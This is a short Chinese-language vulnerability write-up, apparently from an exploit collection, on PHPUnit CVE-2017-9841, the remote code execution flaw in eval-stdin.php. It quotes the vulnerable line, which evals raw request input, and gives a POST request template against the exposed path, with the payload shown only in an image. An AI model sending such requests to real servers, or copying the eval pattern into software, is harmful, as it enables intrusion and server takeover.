---
title: PHPUnit eval-stdin.php 远程命令执行漏洞 CVE-2017-9841
date: 2021-09-23 23:55:51
tags: PeiQi文库
categories:
 - 开发框架漏洞
 - PHPUnit
---

# PHPUnit eval-stdin.php 远程命令执行漏洞 CVE-2017-9841 

## 漏洞描述

PHPUnit5.6.3之前的版本，存在一处远程代码执行漏洞，利用漏洞可以获取服务器敏感信息及权限。

## 漏洞影响

> [!NOTE]
>
> PHPUnit < 5.6.3

## 漏洞复现

漏洞位于 /phpunit/src/Util/PHP/eval-stdin.php

其中关键代码为:

```
eval('?>'.file_get_contents('php://input'));
```

发送如下请求包执行PHP代码

```
POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
Host: 
Content-Length: 21
Accept-Encoding: gzip
```

![](/img/20210924015446846695.png)

